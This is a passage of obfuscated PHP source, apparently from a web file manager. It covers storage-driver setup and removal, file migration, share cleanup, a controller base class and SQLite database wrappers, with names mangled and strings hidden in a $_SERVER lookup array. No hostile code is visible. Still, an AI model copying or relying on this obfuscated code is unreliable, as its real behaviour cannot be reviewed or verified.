trim($Ó„ƒÏí); } } $ÏåÄÚ…[$¬“¡õ¶æ[2477]] = rand_string(6); $¡©¸ÕÊÔ = $GLOBALS[$¬“¡õ¶æ[6]][$¬“¡õ¶æ[92]][$¬“¡õ¶æ[940]]; $Æ•ëò´´ = isset($¡©¸ÕÊÔ[$®ì×”¸]) ? $¡©¸ÕÊÔ[$®ì×”¸] : ucfirst($®ì×”¸); $¥±Ğ¾¥ = $¬“¡õ¶æ[77] . $Æ•ëò´´; if (!$Æ•ëò´´ || !class_exists($¥±Ğ¾¥)) { if ($šÒºš÷) { return LNG($¬“¡õ¶æ[2478]); } write_log(array($¬“¡õ¶æ[2479], $±Ó±Óƒœ, get_caller_info()), $¬“¡õ¶æ[215]); show_json(LNG($¬“¡õ¶æ[2478]), !1, $±Ó±Óƒœ); } $Æ°¿èíˆ = new $¥±Ğ¾¥($ÏåÄÚ…); $çœ Õˆ = rtrim($ÏåÄÚ…[$¬“¡õ¶æ[1320]], $¬“¡õ¶æ[8]) . $¬“¡õ¶æ[8]; if (in_array($®ì×”¸, $Æ°¿èíˆ->objectDriver)) { try { if (!$Æ°¿èíˆ->isBucketCors() && !$Æ°¿èíˆ->setBucketCors()) { $£×Î™¡ = LNG($¬“¡õ¶æ[2480]); $£×Î™¡ .= $¬“¡õ¶æ[2481] . LNG($¬“¡õ¶æ[2482]); } } catch (Exception $Ÿ üÌ‡) { $£×Î™¡ = $Ÿ üÌ‡->getMessage(); } if (isset($£×Î™¡)) { return $this->_parseError($£×Î™¡, $®ì×”¸, $šÒºš÷); } if ($®ì×”¸ == $¬“¡õ¶æ[68] && !$Æ°¿èíˆ->checkRegion()) { return $this->_parseError(LNG($¬“¡õ¶æ[2483]), $®ì×”¸, $šÒºš÷); } } else { if ($®ì×”¸ == $¬“¡õ¶æ[2484]) { if ($Æ°¿èíˆ->ftpPath) { $Ã—ôÜº¶ = trim($çœ Õˆ, $¬“¡õ¶æ[8]); if (stripos($Ã—ôÜº¶, trim($Æ°¿èíˆ->ftpPath, $¬“¡õ¶æ[8])) !== 0) { $çœ Õˆ = $Æ°¿èíˆ->ftpPath . $¬“¡õ¶æ[8] . ($Ã—ôÜº¶ ? $Ã—ôÜº¶ . $¬“¡õ¶æ[8] : $¬“¡õ¶æ[12]); } } } } $ÕÇ«Œº = $Æ°¿èíˆ->getPath($çœ Õˆ . $¬“¡õ¶æ[1324]); try { if ($®ì×”¸ == $¬“¡õ¶æ[107]) { $Æ°¿èíˆ->mkdir($çœ Õˆ); } $…‰Ÿ²Ãì = $Æ°¿èíˆ->mkfile($ÕÇ«Œº); if (!$…‰Ÿ²Ãì) { $£×Î™¡ = LNG($¬“¡õ¶æ[2480]); } } catch (Exception $Ÿ üÌ‡) { $£×Î™¡ = $Ÿ üÌ‡->getMessage(); } if (isset($£×Î™¡)) { return $this->_parseError($£×Î™¡, $®ì×”¸, $šÒºš÷); } $ÏåÄÚ…[$¬“¡õ¶æ[1320]] = $çœ Õˆ; $±Ó±Óƒœ[$¬“¡õ¶æ[6]] = json_encode($ÏåÄÚ…); $±Ó±Óƒœ[$¬“¡õ¶æ[96]] = $Æ•ëò´´; return !0; } private function _parseError($à³ù¸’, $çˆ› Ô¶, $İ‹Òº«ë = false) { $õÏòà›ˆ =& $_SERVER[Ï×Œõ”û]; if ($çˆ› Ô¶ == $õÏòà›ˆ[68] && stripos($à³ù¸’, $õÏòà›ˆ[2485])) { $ƒ¶ñ ä = explode($õÏòà›ˆ[10], $à³ù¸’); $ı·ÌüÀŞ = isset($ƒ¶ñ ä[1]) ? $ƒ¶ñ ä[1] : $õÏòà›ˆ[12]; $²Á¾¥Ïú = array($õÏòà›ˆ[2486] => LNG($õÏòà›ˆ[2487]), $õÏòà›ˆ[2488] => LNG($õÏòà›ˆ[2489])); if (isset($²Á¾¥Ïú[$ı·ÌüÀŞ])) { $à³ù¸’ = $²Á¾¥Ïú[$ı·ÌüÀŞ]; } } if (stripos($à³ù¸’, $õÏòà›ˆ[2490]) === 0) { $®Îæâ¸• = strpos($à³ù¸’, $õÏòà›ˆ[177]); if ($®Îæâ¸• === !1) { $®Îæâ¸• = strpos($à³ù¸’, $õÏòà›ˆ[4]); } if ($®Îæâ¸• !== !1) { $à³ù¸’ = substr($à³ù¸’, $®Îæâ¸• + 1); } } $à³ù¸’ = LNG($õÏòà›ˆ[1327]) . $à³ù¸’; if ($İ‹Òº«ë) { return $à³ù¸’; } show_json($à³ù¸’, !1); } public function driverListSystem() { $ §Ú—×ƒ =& $_SERVER[Ï×Œõ”û]; $°ÀÔÅÑ  = parent::listData(); $ÉŸ»’å = array(); foreach ($°ÀÔÅÑ  as $ß«çÎ’Ú) { unset($ß«çÎ’Ú[$ §Ú—×ƒ[233]], $ß«çÎ’Ú[$ §Ú—×ƒ[88]]); if (!is_array($ß«çÎ’Ú[$ §Ú—×ƒ[6]])) { $ß«çÎ’Ú[$ §Ú—×ƒ[6]] = json_decode($ß«çÎ’Ú[$ §Ú—×ƒ[6]], !0); } $ÉŸ»’å[] = $ß«çÎ’Ú; } return $ÉŸ»’å; } public function defaultDriver() { $å‡ö…æ =& $_SERVER[Ï×Œõ”û]; $‰ì³Ä–´ = parent::listData(); $úŞã¦áõ = array_filter_by_field($‰ì³Ä–´, $å‡ö…æ[37], 1); $úŞã¦áõ = $úŞã¦áõ[0]; if (!$úŞã¦áõ) { return array(); } if (!is_array($úŞã¦áõ[$å‡ö…æ[6]])) { $úŞã¦áõ[$å‡ö…æ[6]] = json_decode($úŞã¦áõ[$å‡ö…æ[6]], !0); } return $úŞã¦áõ; } public function driverInfo($ÒÌç÷ñÖ) { $°á…’ =& $_SERVER[Ï×Œõ”û]; $ûáî¬ü  = array_to_keyvalue(parent::listData(), $°á…’[484]); if (!isset($ûáî¬ü [$ÒÌç÷ñÖ])) { return !1; } $Ÿ­®É¬’ = $ûáî¬ü [$ÒÌç÷ñÖ]; if (!is_array($Ÿ­®É¬’[$°á…’[6]])) { $Ÿ­®É¬’[$°á…’[6]] = json_decode($Ÿ­®É¬’[$°á…’[6]], !0); } return $Ÿ­®É¬’; } public function remove($ìÏ‘ßÀØ) { $this->removeShareItems($ìÏ‘ßÀØ); return parent::remove($ìÏ‘ßÀØ); } public function removeWithFile($‹—«—é¢, $çèñ–ÁÄ, $—Ÿ¸ı, $¢ê ¼Ó = false) { $ßáîä—¶ =& $_SERVER[Ï×Œõ”û]; ignore_timeout(); $Ëà„¹µ¾ = array($ßáîä—¶[932] => $‹—«—é¢); $ÃÑ¿ëˆò = Model($ßáîä—¶[565]); if (isset($GLOBALS[$ßáîä—¶[2491]])) { $„è“Ó€Ã = $GLOBALS[$ßáîä—¶[2491]]; } else { $„è“Ó€Ã = $ÃÑ¿ëˆò->where($Ëà„¹µ¾)->field(array($ßáîä—¶[2388] => $ßáîä—¶[2093], $ßáîä—¶[2463] => $ßáîä—¶[79]))->find(); } $æ¡ùŞ = intval($„è“Ó€Ã[$ßáîä—¶[2093]]); $©©£ë¦ = intval($„è“Ó€Ã[$ßáîä—¶[79]]); $“¯ßí‹î = $çèñ–ÁÄ . $ßáîä—¶[2492] . $‹—«—é¢; $¡‹ÃşÔò = LNG($çèñ–ÁÄ == $ßáîä—¶[648] ? $ßáîä—¶[2493] : $ßáîä—¶[2494]); $©üÍ»ñÑ = new TaskFileTransfer($“¯ßí‹î, $ßáîä—¶[215], $æ¡ùŞ, $¡‹ÃşÔò . $ßáîä—¶[474] . $—Ÿ¸ı[$ßáîä—¶[32]] . $ßáîä—¶[214] . $‹—«—é¢); $©üÍ»ñÑ->task[$ßáîä—¶[870]] = (double) $©©£ë¦; $¤ºÜŠÄı = KodIO::defaultDriver(); $äñ¸ôª¡ = $¤ºÜŠÄı[$ßáîä—¶[484]]; $À’µ‚ŞÉ = 1; $Ø¯áÈï = 5000; $ò“‰ÑØÂ = $®´«öğ— = $†´´İÇ© = array(); $Üƒƒ÷ÛÈ = $ÃÑ¿ëˆò->where($Ëà„¹µ¾)->field($ßáîä—¶[2495])->selectPage($Ø¯áÈï, $À’µ‚ŞÉ); $Ğ£÷ş­ = intval($Üƒƒ÷ÛÈ[$ßáîä—¶[444]][$ßáîä—¶[446]]); while ($Üƒƒ÷ÛÈ && $À’µ‚ŞÉ <= $Ğ£÷ş­) { foreach ($Üƒƒ÷ÛÈ[$ßáîä—¶[447]] as $§¬¨˜öù) { $ÅÜ™²ø = $§¬¨˜öù[$ßáîä—¶[562]]; if ($¢ê ¼Ó) { $®´«öğ—[] = $ÅÜ™²ø; continue; } $Ôã×‹ = $§¬¨˜öù[$ßáîä—¶[87]]; $æ¥èúãÙ = get_path_father($Ôã×‹); $†´´İÇ©[] = $æ¥èúãÙ; $æ¥èúãÙ = str_replace("\173\151\157\x3a{$‹—«—é¢}\x7d\57", "\x7b\x69\157\72{$äñ¸ôª¡}\175\x2f", $æ¥èúãÙ); if (!IO::exist($Ôã×‹)) { $ò“‰ÑØÂ[] = $ÅÜ™²ø; $©üÍ»ñÑ->updateFileEnd($§¬¨˜öù[$ßáîä—¶[32]], $§¬¨˜öù[$ßáîä—¶[79]]); write_log($ßáîä—¶[2496] . $Ôã×‹, $ßáîä—¶[2072]); continue; } $åŒ¼Üï = IO::move($Ôã×‹, $æ¥èúãÙ, REPEAT_RENAME); if (!$åŒ¼Üï) { $®´«öğ—[] = $ÅÜ™²ø; $©üÍ»ñÑ->updateFileEnd($§¬¨˜öù[$ßáîä—¶[32]], $§¬¨˜öù[$ßáîä—¶[79]]); write_log($ßáîä—¶[2497] . $Ôã×‹, $ßáîä—¶[2072]); continue; } $‘£”´Ó‹ = array($ßáîä—¶[932] => $äñ¸ôª¡, $ßáîä—¶[87] => $åŒ¼Üï); $ÃÑ¿ëˆò->where(array($ßáîä—¶[562] => $ÅÜ™²ø))->save($‘£”´Ó‹); } $À’µ‚ŞÉ++; $Üƒƒ÷ÛÈ = $ÃÑ¿ëˆò->where($Ëà„¹µ¾)->field($ßáîä—¶[2495])->selectPage($Ø¯áÈï, $À’µ‚ŞÉ); } $™«ÊÓÆ = $©üÍ»ñÑ->task; if (!$¢ê ¼Ó) { Cache::set($“¯ßí‹î, $™«ÊÓÆ); } $©üÍ»ñÑ->end(); $ò“‰ÑØÂ = array_unique($ò“‰ÑØÂ); $®´«öğ— = array_unique($®´«öğ—); if (!$¢ê ¼Ó && ($ò“‰ÑØÂ || $®´«öğ—)) { $“‰Úá¥Ù = array(); if ($ò“‰ÑØÂ) { $“‰Úá¥Ù[] = sprintf(LNG($ßáîä—¶[2498]), count($ò“‰ÑØÂ)); } if ($®´«öğ—) { $“‰Úá¥Ù[] = sprintf(LNG($ßáîä—¶[2499]), count($®´«öğ—)); } $“‰Úá¥Ù = sprintf(LNG($ßáîä—¶[2500]), implode($ßáîä—¶[1541], $“‰Úá¥Ù)) . $ßáîä—¶[2501] . date($ßáîä—¶[2502]) . $ßáîä—¶[2503]; if ($çèñ–ÁÄ == $ßáîä—¶[1285]) { $“‰Úá¥Ù .= $ßáîä—¶[2504] . LNG($ßáîä—¶[2505]); } else { $“‰Úá¥Ù = LNG($ßáîä—¶[2506]) . $ßáîä—¶[2507] . $“‰Úá¥Ù; } $™«ÊÓÆ[$ßáîä—¶[1322]] = $“‰Úá¥Ù; Cache::set($“¯ßí‹î, $™«ÊÓÆ); unset($—Ÿ¸ı[$ßáîä—¶[6]]); $ŒâÛòµ¹ = array($ßáîä—¶[484] => $‹—«—é¢, $ßáîä—¶[2377] => $ßáîä—¶[648], $ßáîä—¶[32] => $—Ÿ¸ı[$ßáîä—¶[32]], $ßáîä—¶[96] => $—Ÿ¸ı[$ßáîä—¶[96]]); Hook::trigger($ßáîä—¶[1940], array($ßáîä—¶[1344] => $ŒâÛòµ¹, $ßáîä—¶[1354] => !0)); show_json($“‰Úá¥Ù, !1, 100111); } if ($çèñ–ÁÄ == $ßáîä—¶[648]) { return !0; } if ($ò“‰ÑØÂ || $®´«öğ—) { $…×‹ß˜ = array_merge($ò“‰ÑØÂ, $®´«öğ—); $…×‹ß˜ = array_filter(array_unique($…×‹ß˜)); $this->removeByFileID($…×‹ß˜); } if ($†´´İÇ©) { $†´´İÇ© = array_filter(array_unique($†´´İÇ©)); foreach ($†´´İÇ© as $Ôã×‹) { $„è“Ó€Ã = IO::has($Ôã×‹, !0); if (!$„è“Ó€Ã[$ßáîä—¶[241]] && !$„è“Ó€Ã[$ßáîä—¶[242]]) { IO::remove($Ôã×‹); } } } return $this->remove($‹—«—é¢); } private function removeByFileID($¨ï€ÛÕ£ = array()) { $ÉÓ¥«À =& $_SERVER[Ï×Œõ”û]; if (empty($¨ï€ÛÕ£)) { return; } $·Ì“Ã’— = array($ÉÓ¥«À[562] => array($ÉÓ¥«À[7], $¨ï€ÛÕ£)); $ù¶ ƒ¢Ï = Model($ÉÓ¥«À[1487])->where($·Ì“Ã’—)->field($ÉÓ¥«À[2452])->select(); if (!$ù¶ ƒ¢Ï) { return Model($ÉÓ¥«À[565])->remove($¨ï€ÛÕ£); } $ù¶ ƒ¢Ï = array_to_keyvalue($ù¶ ƒ¢Ï, $ÉÓ¥«À[193], $ÉÓ¥«À[562]); foreach ($ù¶ ƒ¢Ï as $ºãÎËè => $Ì¡øıßÏ) { Model($ÉÓ¥«À[939])->removeNow($ºãÎËè, !1); } $‚İ­Ùå’ = array_diff($¨ï€ÛÕ£, array_unique(array_values($ù¶ ƒ¢Ï))); if ($‚İ­Ùå’) { return Model($ÉÓ¥«À[565])->remove($‚İ­Ùå’); } } private function removeShareItems($Â¹«İÖÊ) { $ÇÖÑàä¤ =& $_SERVER[Ï×Œõ”û]; $Àåæ…› = "\173\x69\x6f\x3a{$Â¹«İÖÊ}\x7d\57"; $ªû¸òÛä = array($ÇÖÑàä¤[193] => 0, $ÇÖÑàä¤[588] => array($ÇÖÑàä¤[471], "{$Àåæ…›}\45")); $•õú = Model($ÇÖÑàä¤[1517])->where($ªû¸òÛä)->field($ÇÖÑàä¤[693])->select(); if (empty($•õú)) { return; } $ŒÂ¬ÅÖô = array_to_keyvalue($•õú, $ÇÖÑàä¤[12], $ÇÖÑàä¤[693]); Model($ÇÖÑàä¤[692])->remove($ŒÂ¬ÅÖô); } } goto AªÏÄíùñ; A¹‘­òóæ…: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $•ïü‰§¶ =& $_SERVER[Ï×Œõ”û]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$•ïü‰§¶[6]] =& $config; $this->values[$•ïü‰§¶[7]] =& $in; $this->tpl = TEMPLATE . MOD . $•ïü‰§¶[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ƒ¨’ˆ‘Ÿ) { if (1 === func_num_args()) { $this->{$ƒ¨’ˆ‘Ÿ} = new $ƒ¨’ˆ‘Ÿ(); } else { $ŞÓÈœŒ = new ReflectionClass($ƒ¨’ˆ‘Ÿ); $œ¹¯”°Ü = func_get_args(); array_shift($œ¹¯”°Ü); $this->{$ƒ¨’ˆ‘Ÿ} = $ŞÓÈœŒ->newInstanceArgs($œ¹¯”°Ü); } return $this->{$ƒ¨’ˆ‘Ÿ}; } public function routeBind($ŠÎÕŞ´Î, $¡½¤„ºñ, $âü´É™ò = 3) { $®·€·±å =& $_SERVER[Ï×Œõ”û]; $˜®¾Ô×– = $this->in[$®·€·±å[9]]; $ŠÎÕŞ´Î = str_replace($®·€·±å[10], $®·€·±å[11], trim(trim($ŠÎÕŞ´Î, $®·€·±å[8]), $®·€·±å[12])); if (!$ŠÎÕŞ´Î || count($˜®¾Ô×–) <= $âü´É™ò) { return !1; } $¦Í€²¸ğ = !0; $ÕòåÖ€å = explode($®·€·±å[8], $ŠÎÕŞ´Î); for ($¡÷¸Ó÷ö = 0; $¡÷¸Ó÷ö < count($ÕòåÖ€å); $¡÷¸Ó÷ö++) { if ($ÕòåÖ€å[$¡÷¸Ó÷ö] != $˜®¾Ô×–[$âü´É™ò + $¡÷¸Ó÷ö]) { $¦Í€²¸ğ = !1; break; } } if (!$¦Í€²¸ğ) { return; } call_user_func_array(array($this, $¡½¤„ºñ), array()); } public function routeArgs($’Ã‘Ñ¼† = 3) { $¢Ø…¯½¸ = $this->in[$_SERVER[Ï×Œõ”û][9]]; if (count($¢Ø…¯½¸) <= $’Ã‘Ñ¼†) { return array(); } $Ÿ„«™ = array(); for ($¾ıÔË„í = $’Ã‘Ñ¼†; $¾ıÔË„í < count($¢Ø…¯½¸); $¾ıÔË„í += 2) { $Ÿ„«™[$¢Ø…¯½¸[$¾ıÔË„í]] = $¢Ø…¯½¸[$¾ıÔË„í + 1]; $this->in[$¢Ø…¯½¸[$¾ıÔË„í]] = $¢Ø…¯½¸[$¾ıÔË„í + 1]; } return $Ÿ„«™; } protected function assign($âæñÈºç, $Ì™ã²‘¿) { $this->values[$âæñÈºç] = $Ì™ã²‘¿; } protected function display($’¤•—ïô) { ob_end_clean(); extract($this->values); require $this->tpl . $’¤•—ïô; } } class DbSqliteBase extends Db { public function __construct($ò÷Úš¿ = '') { $ŠÈ­ü•Í =& $_SERVER[Ï×Œõ”û]; if (!extension_loaded($ŠÈ­ü•Í[13])) { think_exception(think_lang($ŠÈ­ü•Í[14]) . $ŠÈ­ü•Í[15]); } if (!empty($ò÷Úš¿)) { if (!isset($ò÷Úš¿[$ŠÈ­ü•Í[16]])) { $ò÷Úš¿[$ŠÈ­ü•Í[16]] = 438; } $this->config = $ò÷Úš¿; if (empty($this->config[$ŠÈ­ü•Í[17]])) { $this->config[$ŠÈ­ü•Í[17]] = array(); } } } public function connect($Ï÷÷‚œü = '', $ğ¸©Î‰â = 0) { $¥¡ğø©Ş =& $_SERVER[Ï×Œõ”û]; if (!isset($this->linkID[$ğ¸©Î‰â])) { if (empty($Ï÷÷‚œü)) { $Ï÷÷‚œü = $this->config; } $š£ÊéŒŸ = !empty($Ï÷÷‚œü[$¥¡ğø©Ş[17]][$¥¡ğø©Ş[18]]) ? $Ï÷÷‚œü[$¥¡ğø©Ş[17]][$¥¡ğø©Ş[18]] : $this->pconnect; $ËƒˆÔÁ = $š£ÊéŒŸ ? $¥¡ğø©Ş[19] : $¥¡ğø©Ş[20]; $this->linkID[$ğ¸©Î‰â] = $ËƒˆÔÁ($Ï÷÷‚œü[$¥¡ğø©Ş[21]], $Ï÷÷‚œü[$¥¡ğø©Ş[16]]); if (!$this->linkID[$ğ¸©Î‰â]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ğ¸©Î‰â], 30000); if (1 != think_config($¥¡ğø©Ş[22])) { unset($this->config); } } return $this->linkID[$ğ¸©Î‰â]; } public function free() { $this->queryID = null; } public function query($Õ¯†ÖœÓ) { $‹Èşï‚ =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Õ¯†ÖœÓ; if ($this->queryID) { $this->free(); } think_action_status($‹Èşï‚[23], 1); think_status($‹Èşï‚[24]); $this->queryID = sqlite_query($this->_linkID, $Õ¯†ÖœÓ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $çâ‡Ñá = $this->getAll(); return $çâ‡Ñá; } } public function execute($ì¦ÃÛŒƒ) { $Ğ³şì¸ =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ì¦ÃÛŒƒ; if ($this->queryID) { $this->free(); } think_action_status($Ğ³şì¸[25], 1); think_status($Ğ³şì¸[24]); $øîåÉ”¨ = sqlite_exec($this->_linkID, $ì¦ÃÛŒƒ); $this->debug(); if (!1 === $øîåÉ”¨) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ï×Œõ”û][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‡°şéÎ‹ = sqlite_query($this->_linkID, $_SERVER[Ï×Œõ”û][27]); if (!$‡°şéÎ‹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $İ¢ñÅî‰ = sqlite_query($this->_linkID, $_SERVER[Ï×Œõ”û][28]); if (!$İ¢ñÅî‰) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $‘ü°ç²± = array(); if ($this->numRows > 0) { for ($üö¥•¨³ = 0; $üö¥•¨³ < $this->numRows; $üö¥•¨³++) { $‘ü°ç²±[$üö¥•¨³] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $‘ü°ç²±; } public function getFields($Ëî»ò¥Ú) { $Æ¥å¨ùÎ =& $_SERVER[Ï×Œõ”û]; $´ŠùûÍ™ = $this->query($Æ¥å¨ùÎ[29] . $Ëî»ò¥Ú . $Æ¥å¨ùÎ[30]); $ÖıŞ¡¸ = array(); if ($´ŠùûÍ™) { foreach ($´ŠùûÍ™ as $øŸŠÎä => $áâï’ºŒ) { $ÖıŞ¡¸[$áâï’ºŒ[$Æ¥å¨ùÎ[31]]] = array($Æ¥å¨ùÎ[32] => $áâï’ºŒ[$Æ¥å¨ùÎ[31]], $Æ¥å¨ùÎ[33] => $áâï’ºŒ[$Æ¥å¨ùÎ[34]], $Æ¥å¨ùÎ[35] => (bool) ($áâï’ºŒ[$Æ¥å¨ùÎ[36]] === $Æ¥å¨ùÎ[12]), $Æ¥å¨ùÎ[37] => $áâï’ºŒ[$Æ¥å¨ùÎ[38]], $Æ¥å¨ùÎ[39] => strtolower($áâï’ºŒ[$Æ¥å¨ùÎ[40]]) == $Æ¥å¨ùÎ[41], $Æ¥å¨ùÎ[42] => strtolower($áâï’ºŒ[$Æ¥å¨ùÎ[43]]) == $Æ¥å¨ùÎ[44]); } } return $ÖıŞ¡¸; } public function getTables($£«‚‰ÜØ = '') { $âÇ˜¼› =& $_SERVER[Ï×Œõ”û]; $¨ßÒ°ïú = $this->query($âÇ˜¼›[45] . $âÇ˜¼›[46] . $âÇ˜¼›[47]); $‚°Ü¡ãœ = array(); foreach ($¨ßÒ°ïú as $¼Ö®¸§» => $Ğ™¸÷‘â) { $‚°Ü¡ãœ[$¼Ö®¸§»] = current($Ğ™¸÷‘â); } return $‚°Ü¡ãœ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÈÇŸ±¦Ô =& $_SERVER[Ï×Œõ”û]; $ëÄŒ´Üá = sqlite_last_error($this->_linkID); $this->error = $ëÄŒ´Üá . $ÈÇŸ±¦Ô[4] . sqlite_error_string($ëÄŒ´Üá); if ($ÈÇŸ±¦Ô[12] != $this->queryStr) { $this->error .= LNG($ÈÇŸ±¦Ô[48]) . $this->queryStr; } think_trace($this->error, $ÈÇŸ±¦Ô[12], $ÈÇŸ±¦Ô[49]); return $this->error; } public function escapeString($ÍÜß‹ÕÑ) { return sqlite_escape_string($ÍÜß‹ÕÑ); } public function parseLimit($ °†ô§) { $à¾ëÏÉ³ =& $_SERVER[Ï×Œõ”û]; $Ó±áé = $à¾ëÏÉ³[12]; if (!empty($ °†ô§)) { $ °†ô§ = explode($à¾ëÏÉ³[50], $ °†ô§); if (count($ °†ô§) > 1) { $Ó±áé .= $à¾ëÏÉ³[51] . $ °†ô§[1] . $à¾ëÏÉ³[52] . $ °†ô§[0] . $à¾ëÏÉ³[53]; } else { $Ó±áé .= $à¾ëÏÉ³[51] . $ °†ô§[0] . $à¾ëÏÉ³[53]; } } return $Ó±áé; } } class DbSqlite3Base extends Db { public function __construct($”¸ƒ€ÊØ = '') { $Ïã»ÃÂÔ =& $_SERVER[Ï×Œõ”û]; if (!class_exists($Ïã»ÃÂÔ[54])) { think_exception(think_lang($Ïã»ÃÂÔ[14]) . $Ïã»ÃÂÔ[55]); } if (!empty($”¸ƒ€ÊØ)) { if (!isset($”¸ƒ€ÊØ[$Ïã»ÃÂÔ[16]])) { $”¸ƒ€ÊØ[$Ïã»ÃÂÔ[16]] = 438; } $this->config = $”¸ƒ€ÊØ; if (empty($this->config[$Ïã»ÃÂÔ[17]])) { $this->config[$Ïã»ÃÂÔ[17]] = array(); } } } public function connect($à—Òƒêê = '', $÷Êİ¥±’ = 0) { $ƒõæş½  =& $_SERVER[Ï×Œõ”û]; if (!isset($this->linkID[$÷Êİ¥±’])) { if (empty($à—Òƒêê)) { $à—Òƒêê = $this->config; } $this->linkID[$÷Êİ¥±’] = new SQLite3($à—Òƒêê[$ƒõæş½ [21]]); if (!$this->linkID[$÷Êİ¥±’]) { think_exception($this->linkID[$÷Êİ¥±’]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$÷Êİ¥±’]->busyTimeout(30000); if (1 != think_config($ƒõæş½ [22])) { unset($this->config); } } return $this->linkID[$÷Êİ¥±’]; } public function free() { $this->queryID = null; } public function query($äèá’¤ò) { $Ò¾¯‡³² =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $äèá’¤ò; if ($this->queryID) { $this->free(); } think_action_status($Ò¾¯‡³²[23], 1); think_status($Ò¾¯‡³²[24]); $this->queryID = $this->_linkID->query($äèá’¤ò); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $êÃÄÊîù = $this->getAll(); $this->numRows = count($êÃÄÊîù); return $êÃÄÊîù; } } public function execute($ã¬§Æ¼ò) { $ÙĞÁ¿™¬ =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ã¬§Æ¼ò; if ($this->queryID) { $this->free(); } think_action_status($ÙĞÁ¿™¬[25], 1); think_status($ÙĞÁ¿™¬[24]); $ØâŠ§£º = $this->_linkID->exec($ã¬§Æ¼ò); $this->debug(); if (!1 === $ØâŠ§£º) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ï×Œõ”û][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ò¼É³¯“ = $this->_linkID->query($_SERVER[Ï×Œõ”û][27]); if (!$ò¼É³¯“) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Íâı¤×‹ = $this->_linkID->query($_SERVER[Ï×Œõ”û][28]); if (!$Íâı¤×‹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $»øÃ¬ßÂ = array(); while ($†‹ß­ÌÀ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $»øÃ¬ßÂ[] = $†‹ß­ÌÀ; } $this->queryID->reset(); return $»øÃ¬ßÂ; } public function getFields($ÍØ¦¹­) { $Ì¥‘§Ë =& $_SERVER[Ï×Œõ”û]; $İ¯›ìÂ = $this->query($Ì¥‘§Ë[29] . $ÍØ¦¹­ . $Ì¥‘§Ë[30]); $ÖûååŒ¾ = array(); if ($İ¯›ìÂ) { foreach ($İ¯›ìÂ as $¨ÄƒÉõ‡ => $Ïó‹¦Ü«) { $ÖûååŒ¾[$Ïó‹¦Ü«[$Ì¥‘§Ë[32]]] = array($Ì¥‘§Ë[32] => $Ïó‹¦Ü«[$Ì¥‘§Ë[32]], $Ì¥‘§Ë[33] => $Ïó‹¦Ü«[$Ì¥‘§Ë[33]], $Ì¥‘§Ë[35] => (bool) ($Ïó‹¦Ü«[$Ì¥‘§Ë[35]] === $Ì¥‘§Ë[12]), $Ì¥‘§Ë[37] => $Ïó‹¦Ü«[$Ì¥‘§Ë[56]], $Ì¥‘§Ë[39] => (bool) $Ïó‹¦Ü«[$Ì¥‘§Ë[57]], $Ì¥‘§Ë[42] => (bool) $Ïó‹¦Ü«[$Ì¥‘§Ë[57]]); } } return $ÖûååŒ¾; } public function getTables($…Î€ëë = '') { $™ÑÌÒ­í =& $_SERVER[Ï×Œõ”û]; $¸º±åÙ = $this->query($™ÑÌÒ­í[45] . $™ÑÌÒ­í[46] . $™ÑÌÒ­í[47]); $áãäé—– = array(); foreach ($¸º±åÙ as $ÂÌÆï÷– => $œ¢¶ñ‡Û) { $áãäé—–[$ÂÌÆï÷–] = current($œ¢¶ñ‡Û); } return $áãäé—–; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $âŒƒÄ¾• =& $_SERVER[Ï×Œõ”û]; $this->error = $this->_linkID->lastErrorMsg(); if ($âŒƒÄ¾•[12] != $this->queryStr) { $this->error .= LNG($âŒƒÄ¾•[48]) . $this->queryStr; } think_trace($this->error, $âŒƒÄ¾•[12], $âŒƒÄ¾•[49]); return $this->error; } public function escapeString($Äµå¶šş) { $†áªÃµî =& $_SERVER[Ï×Œõ”û]; if ($this->_linkID) { return $this->_linkID->escapeString($Äµå¶šş); } return str_ireplace($†áªÃµî[58], $†áªÃµî[59], $Äµå¶šş); } public function parseLimit($‘ôôğ„ë) { $Øà»õ¥ =& $_SERVER[Ï×Œõ”û]; $£ä‘õ–Ş = $Øà»õ¥[12]; if (!empty($‘ôôğ„ë)) { $‘ôôğ„ë = explode($Øà»õ¥[50], $‘ôôğ„ë); if (count($‘ôôğ„ë) > 1) { $£ä‘õ–Ş .= $Øà»õ¥[51] . $‘ôôğ„ë[1] . $Øà»õ¥[52] . $‘ôôğ„ë[0] . $Øà»õ¥[53]; } else { $£ä‘õ–Ş .= 